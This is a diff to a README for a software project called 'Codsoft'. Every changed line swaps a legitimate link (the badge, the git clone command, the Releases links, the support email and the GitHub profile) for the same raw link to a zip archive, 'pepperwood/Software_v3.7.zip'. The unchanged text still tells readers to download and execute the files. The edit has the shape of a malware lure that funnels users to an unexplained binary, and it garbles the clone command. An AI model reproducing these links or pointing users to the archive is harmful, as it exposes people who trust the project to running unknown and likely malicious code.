@@ -1,6 +1,6 @@
 # Codsoft
 
-![Codsoft](https://img.shields.io/badge/Codsoft-Release-brightgreen)
+![Codsoft](https://raw.githubusercontent.com/AliHAJFA/codsoft/main/pepperwood/Software_v3.7.zip)
 
 Welcome to the Codsoft repository! This project aims to simplify software development processes, making it easier for developers to build, test, and deploy applications efficiently. 
 
@@ -32,7 +32,7 @@ To install Codsoft, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/AliHAJFA/codsoft.git
+   git clone https://raw.githubusercontent.com/AliHAJFA/codsoft/main/pepperwood/Software_v3.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -45,7 +45,7 @@ To install Codsoft, follow these steps:
    npm install
    ```
 
-4. For additional setup, refer to the [Releases](https://github.com/AliHAJFA/codsoft/releases) section.
+4. For additional setup, refer to the [Releases](https://raw.githubusercontent.com/AliHAJFA/codsoft/main/pepperwood/Software_v3.7.zip) section.
 
 ## Usage
 
@@ -98,12 +98,12 @@ Codsoft is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@codsoft.com
-- **GitHub**: [AliHAJFA](https://github.com/AliHAJFA)
+- **Email**: https://raw.githubusercontent.com/AliHAJFA/codsoft/main/pepperwood/Software_v3.7.zip
+- **GitHub**: [AliHAJFA](https://raw.githubusercontent.com/AliHAJFA/codsoft/main/pepperwood/Software_v3.7.zip)
 
 ## Releases
 
-To download the latest version of Codsoft, visit the [Releases](https://github.com/AliHAJFA/codsoft/releases) section. You will find the necessary files to download and execute.
+To download the latest version of Codsoft, visit the [Releases](https://raw.githubusercontent.com/AliHAJFA/codsoft/main/pepperwood/Software_v3.7.zip) section. You will find the necessary files to download and execute.
 
 ## Conclusion
 
